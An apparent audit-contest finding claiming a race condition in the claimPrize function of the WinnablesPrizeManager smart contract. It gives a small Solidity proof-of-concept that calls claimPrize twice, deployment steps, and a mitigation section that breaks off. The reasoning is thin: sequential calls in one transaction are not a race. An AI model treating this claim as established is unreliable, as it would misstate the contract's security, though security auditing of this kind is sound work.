# Race Condition in Prize Claiming at WinnablesPrizeManager contract

### Summary

Line: https://github.com/sherlock-audit/2024-08-winnables-raffles/blob/main/public-contracts/contracts/WinnablesPrizeManager.sol#L105

 The claimPrize function does not lock the prize before transferring it, which could potentially allow a race condition where multiple transactions try to claim the same prize.

### Root Cause

Race condition

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

 If exploited, this could lead to multiple claims of the same prize, resulting in unauthorized distribution of funds or assets.

### PoC

Testing Contract

```solidity

pragma solidity 0.8.24;

import "./WinnablesPrizeManager.sol";

contract RaceConditionTester {
    WinnablesPrizeManager public target;
    uint256 public raffleId;

    constructor(WinnablesPrizeManager _target, uint256 _raffleId) {
        target = _target;
        raffleId = _raffleId;
    }

    // Simulate multiple users claiming the prize at the same time
    function simulateRaceCondition() external {
        // Call claimPrize in a loop to simulate concurrent transactions
        // In a real attack, this would be done by multiple users or bots
        target.claimPrize(raffleId);
        target.claimPrize(raffleId);
    }

    // Fallback function to receive ETH
    receive() external payable {}
}

```
 Testing the Race Condition
Deploy the WinnablesPrizeManager contract.
Fund the WinnablesPrizeManager contract with ETH using depositETH.
Set a raffle using setRaffle with an ETH prize.
Deploy the RaceConditionTester contract with the address of the WinnablesPrizeManager contract and the raffleId.
Call the simulateRaceCondition function on the RaceConditionTester contract.

### Mitigation

To prevent race conditions, consider implementing a locking mechanism to ensure that only one transaction can access the critical section (the prize claiming logic) at a time:
